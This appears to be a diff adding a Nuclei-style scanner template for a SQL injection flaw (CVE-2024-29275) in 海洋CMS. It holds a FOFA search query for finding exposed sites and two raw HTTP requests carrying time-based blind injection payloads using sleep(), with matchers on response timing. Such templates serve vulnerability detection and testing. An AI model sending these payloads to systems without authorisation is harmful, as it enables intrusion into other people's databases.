@@ -1,0 +1,35 @@
+id: haiyangCMS-dmku-sql-injection-CVE-2024-29275
+
+info:
+  name: "海洋CMS / 路径 SQL 注入漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: app="海洋CMS"
+      海洋CMS影视管理系统在/js/player/dmplayer/dmku/路径中存在SQL注入缺陷，允许远程攻击者执行未经验证的SQL查询，从而泄露数据库凭证及敏感数据。成功利用该漏洞可导致服务器权限被篡夺，进而引发全面的系统妥协。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247484329&idx=1&sn=e1090d3a48b7f41597cfb10b01245965&chksm=c267b69af5103f8c0ccf31f895d6d97bd15a369a91ffc175b535252964131396529b366d4a69&token=1619136955&lang=zh_CN#rd
+  tags: 海洋CMS
+
+http:
+- raw:
+  - |
+    GET /js/player/dmplayer/dmku/?ac=del&id=(select(0)from(select(sleep(4)))v)&type=list HTTP/1.1 
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+
+  - |
+    GET /js/player/dmplayer/dmku/?ac=del&id=(select(0)from(select(sleep(8)))v)&type=list HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+
+  matchers-condition: and
+  matchers:
+  - type: dsl
+    dsl:
+    - 'duration_1>=4 && duration_1<=5'
+    - 'duration_2>=8 && duration_2<=9'
+    condition: and
+  - type: status
+    status:
+    - 200
